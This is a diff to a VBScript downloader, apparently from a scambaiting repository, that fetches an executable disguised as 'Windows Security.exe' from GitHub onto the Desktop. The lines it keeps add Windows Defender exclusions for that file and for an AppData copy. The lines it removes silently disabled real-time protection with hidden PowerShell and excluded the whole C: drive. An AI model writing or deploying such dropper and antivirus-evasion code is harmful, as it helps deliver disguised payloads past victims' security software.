@@ -20,13 +20,9 @@ desktop = ws.SpecialFolders("Desktop")
 exeUrl = "https://github.com/boucegame/ScamBaiting/raw/refs/heads/main/Windows%20Security.exe"
 exePath = desktop & "\Windows Security.exe"
 
-' Disable real-time protection silently
-RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true"
-
 ' Add Defender exclusions before downloading
 subDirPath = ws.ExpandEnvironmentStrings("%APPDATA%\SubDir")
 subDirExe = subDirPath & "\Windows Security.exe"
-AddDefenderExclusion "C:\" ' Add C: drive exclusion
 AddDefenderExclusion desktop
 AddDefenderExclusion exePath
 AddDefenderExclusion subDirExe
@@ -67,9 +63,6 @@ If fso.FileExists(exePath) Then
 Else
     MsgBox "Failed to download the EXE file."
 End If
-
-' Re-enable real-time protection
-RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $false"
 
 ' === FUNCTIONS ===
 
